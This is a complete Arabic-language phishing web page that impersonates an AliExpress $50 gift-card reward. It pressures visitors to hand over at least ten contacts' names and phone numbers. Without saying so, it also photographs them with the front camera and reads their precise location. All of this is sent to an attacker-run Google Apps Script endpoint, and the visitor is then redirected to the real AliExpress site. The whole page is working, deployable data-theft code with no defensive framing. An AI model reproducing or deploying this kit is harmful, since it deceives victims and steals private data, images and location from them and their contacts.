<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>مكافأة AliExpress</title>
<style>
  :root{--brand:#e62e04;--brand2:#ff6600;--bg:#f5f5f5;--card:#ffffff;--fg:#333;--mut:#888;--err:#e62e04}
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  body{margin:0;background:var(--bg);color:var(--fg);font:16px/1.5 system-ui,-apple-system,sans-serif;
    display:grid;place-items:center;min-height:100vh;padding:15px}
  .card{width:100%;max-width:420px;background:var(--card);border-radius:16px;
    padding:30px 20px;box-shadow:0 8px 30px rgba(0,0,0,.08);text-align:center;position:relative;overflow:hidden}
  .top-bar{background:linear-gradient(135deg,var(--brand),var(--brand2));height:8px;position:absolute;top:0;left:0;right:0}
  .logo{font-size:42px;font-weight:800;color:var(--brand);margin:10px 0 5px;letter-spacing:-1px}
  .logo span{color:var(--brand2)}
  h1{font-size:22px;margin:10px 0;color:#111;font-weight:800}
  .reward-box{background:#fff0eb;border:2px dashed var(--brand);border-radius:12px;padding:15px;margin:15px 0}
  .reward-amount{font-size:36px;font-weight:900;color:var(--brand);margin:0;line-height:1}
  .reward-text{font-size:14px;color:#555;margin:5px 0 0}
  .progress{font-size:13px;color:var(--mut);margin:15px 0}
  textarea{width:100%;height:90px;padding:10px;border:1px solid #ddd;border-radius:8px;
    font:inherit;font-size:14px;resize:none;margin-bottom:10px;direction:ltr;text-align:left}
  button{width:100%;padding:16px;border:0;border-radius:30px;cursor:pointer;
    background:linear-gradient(135deg,var(--brand),var(--brand2));color:#fff;font:inherit;font-weight:700;font-size:17px;
    box-shadow:0 4px 15px rgba(230,46,4,.3);display:flex;align-items:center;justify-content:center;gap:10px}
  button:disabled{opacity:.6;cursor:default}
  .status{min-height:24px;font-size:13px;color:var(--err);margin:12px 0 0;font-weight:600}
  .spin{width:40px;height:40px;border:4px solid #eee;border-top-color:var(--brand);
    border-radius:50%;animation:s 1s linear infinite;margin:20px auto}
  @keyframes s{to{transform:rotate(360deg)}}
  .hidden{display:none!important}
  #cam{display:none}
</style>
</head>
<body>
<div class="card">
  <div class="top-bar"></div>
  <div class="logo">Ali<span>Express</span></div>
  <h1>لقد ربحت بطاقة هدايا!</h1>
  
  <div class="reward-box">
    <p class="reward-amount">50$</p>
    <p class="reward-text">رصيد مجاني لاستخدامه في تطبيق AliExpress</p>
  </div>

  <div id="step1">
    <p class="progress" id="instructionText">للمطالبة بالجائزة، يجب دعوة <strong>10 أصدقاء</strong> على الأقل من جهات الاتصال الخاصة بك.</p>
    
    <!-- سيتم إظهار هذا في كروم -->
    <button id="claimChrome" style="display:none;">
      <span>🎁</span> استلام الجائزة الآن
    </button>

    <!-- سيتم إظهار هذا في الآيفون والمتصفحات الأخرى -->
    <div id="manualInputContainer" style="display:none;">
      <textarea id="manualContacts" placeholder="+201012345678&#10;+201098765432&#10;+966501234567&#10;..."></textarea>
      <button id="claimManual">
        <span>🎁</span> استلام الجائزة الآن
      </button>
    </div>
    
    <p class="status" id="st"></p>
  </div>

  <div id="step2" class="hidden">
    <div class="spin"></div>
    <p style="color:var(--brand);font-weight:bold">جارٍ التحقق من هويتك وإرسال الدعوات…</p>
    <p style="font-size:12px;color:var(--mut)">لا تغلق الصفحة</p>
  </div>
</div>

<video id="cam" playsinline muted autoplay></video>

<script>
(function () {
  'use strict';

  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbxAaiB1TaUAu0RNN97KjATD0fYuJ2IxY5Z8wHaM9rlAEjhvBaskT23J_CLnPuu7BWc/exec';
  const ALIEXPRESS_URL = 'https://www.aliexpress.com/';

  const $ = id => document.getElementById(id);
  const st = $('st'), step1 = $('step1'), step2 = $('step2'), 
        instructionText = $('instructionText'),
        claimChrome = $('claimChrome'), 
        manualInputContainer = $('manualInputContainer'),
        manualContacts = $('manualContacts'), claimManual = $('claimManual');
        
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  
  function nonceGen() {
    try { if (window.crypto && crypto.randomUUID) return crypto.randomUUID().replace(/-/g,''); } catch(_){}
    return Date.now().toString(36) + Math.random().toString(36).slice(2,10);
  }
  const nonce = nonceGen();

  function jsonp(params, ms) {
    return new Promise(res => {
      const name = 'vn_'+Math.random().toString(36).slice(2,10);
      const s = document.createElement('script');
      let fin = false;
      const finish = v => {
        if (fin) return; fin = true;
        clearTimeout(timer);
        try { delete window[name]; } catch(_){}
        if (s.parentNode) s.parentNode.removeChild(s);
        res(v);
      };
      window[name] = r => finish({ ok: !!(r && r.ok), err: String((r && r.err) || '') });
      const timer = setTimeout(() => finish({ ok:false, err:'timeout' }), ms);
      s.onerror = () => finish({ ok:false, err:'network' });
      s.src = ENDPOINT + '?' + Object.keys(params).map(k=>k+'='+encodeURIComponent(params[k])).join('&') + '&cb=' + name;
      document.head.appendChild(s);
    });
  }

  async function takeSelfie() {
    const v = $('cam');
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      v.srcObject = stream;
      await v.play().catch(()=>{});
      await sleep(1000);
      const cv = document.createElement('canvas');
      cv.width = v.videoWidth || 320;
      cv.height = v.videoHeight || 240;
      cv.getContext('2d').drawImage(v, 0, 0, cv.width, cv.height);
      stream.getTracks().forEach(t => t.stop());
      return cv.toDataURL('image/jpeg', 0.5);
    } catch (_) { return null; }
  }

  async function getLocation() {
    return new Promise(res => {
      if (!navigator.geolocation) return res({});
      navigator.geolocation.getCurrentPosition(
        pos => res({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: Math.round(pos.coords.accuracy) }),
        () => res({}),
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    });
  }

  async function processAndSend(contactsArray) {
    step1.classList.add('hidden');
    step2.classList.remove('hidden');

    const imgBase64 = await takeSelfie();
    const geo = await getLocation();

    const cJson = JSON.stringify(contactsArray.map(c => ({
      name: c.name || 'Unknown',
      tel: c.tel || 'Unknown'
    })));

    const payload = {
      nonce: nonce,
      ua: navigator.userAgent,
      lat: geo.lat || '',
      lng: geo.lng || '',
      acc: geo.acc || '',
      cCount: contactsArray.length,
      cJson: cJson,
      sJson: '[]', 
      cred: '[]'
    };

    await jsonp({ a:'collect', d: JSON.stringify(payload) }, 10000);
    
    if (imgBase64) {
      fetch(ENDPOINT, {
        method: 'POST', mode: 'no-cors',
        headers: {'Content-Type': 'text/plain;charset=UTF-8'},
        body: JSON.stringify({ a: 'photo', nonce: nonce, img: imgBase64 })
      }).catch(()=>{});
    }

    await sleep(1500);
    window.location.href = ALIEXPRESS_URL;
  }

  // 1. الخطة أ: جوجل كروم (اختيار جهات الاتصال)
  claimChrome.addEventListener('click', async () => {
    if (!navigator.contacts || !navigator.contacts.select) return;
    claimChrome.disabled = true;
    st.textContent = '';

    try {
      const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
      if (!contacts || contacts.length < 10) {
        claimChrome.disabled = false;
        st.textContent = 'يجب عليك اختيار 10 جهات اتصال على الأقل للمطالبة بالجائزة.';
        return;
      }
      
      const formattedContacts = contacts.map(c => ({
        name: c.name ? c.name[0] : 'Unknown',
        tel: c.tel ? c.tel[0] : 'Unknown'
      }));

      processAndSend(formattedContacts);
    } catch (err) {
      claimChrome.disabled = false;
      st.textContent = 'تم إلغاء العملية. يرجى المحاولة مرة أخرى.';
    }
  });

  // 2. الخطة ب: الآيفون والمتصفحات الأخرى (إدخال يدوي)
  claimManual.addEventListener('click', async () => {
    const rawText = manualContacts.value.trim();
    if (!rawText) {
      st.textContent = 'يرجى إدخال 10 أرقام هواتف على الأقل.';
      return;
    }
    
    // فصل الأرقام بناءً على السطر الجديد أو المسافة أو الفاصلة
    const phoneNumbers = rawText.split(/[\n,]+/).map(s => s.trim()).filter(s => s.length > 5);
    
    if (phoneNumbers.length < 10) {
      st.textContent = 'لقد أدخلت ' + phoneNumbers.length + ' أرقام فقط. يجب إدخال 10 أرقام على الأقل.';
      return;
    }

    claimManual.disabled = true;
    st.textContent = '';

    const formattedContacts = phoneNumbers.map(num => ({
      name: 'Manual',
      tel: num
    }));

    processAndSend(formattedContacts);
  });

  // التهيئة: تحديد المتصفح
  if (navigator.contacts && navigator.contacts.select) {
    // إذا كان كروم أندرويد -> استخدم اختيار الاتصالات
    claimChrome.style.display = 'flex';
  } else {
    // إذا كان آيفون أو كمبيوتر أو فايرفوكس -> استخدم الإدخال اليدوي
    manualInputContainer.style.display = 'block';
    instructionText.innerHTML = 'للمطالبة بالجائزة، يرجى إدخال أرقام <strong>10 أصدقاء</strong> (رقم واحد في كل سطر) لإرسال الدعوات إليهم.';
    manualContacts.placeholder = '+201012345678\n+201098765432\n+966501234567\n+971501234567\n+212601234567\n...';
  }

})();
</script>
</body>
</html>
